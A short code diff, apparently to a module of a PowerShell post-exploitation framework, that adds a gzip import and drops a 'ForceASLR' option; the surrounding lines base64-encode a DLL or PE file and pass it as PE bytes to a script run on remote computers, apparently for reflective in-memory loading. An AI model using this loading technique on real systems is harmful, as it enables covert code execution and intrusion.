@@ -3,6 +3,7 @@ from builtins import str
 from builtins import object
 from lib.common import helpers
 import base64
+import gzip
 
 class Module(object):
 
@@ -63,11 +64,6 @@ class Module(object):
                 'Required'      :   False,
                 'Value'         :   ''
             },
-            'ForceASLR' : {
-                'Description'   :   'Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn\'t support ASLR.',
-                'Required'      :   True,
-                'Value'         :   'False'
-            },
             'ComputerName' : {
                 'Description'   :   'Optional an array of computernames to run the script on.',
                 'Required'      :   False,
@@ -118,7 +114,6 @@ class Module(object):
                             f = open(values['Value'], 'rb')
                             dllbytes = f.read()
                             f.close()
-
                             base64bytes = base64.b64encode(dllbytes)
                             scriptEnd = "\n$PE =  [System.Convert]::FromBase64String(\'" + base64bytes.decode('latin-1') + "\')" + scriptEnd
                             scriptEnd += " -PEBytes $PE"
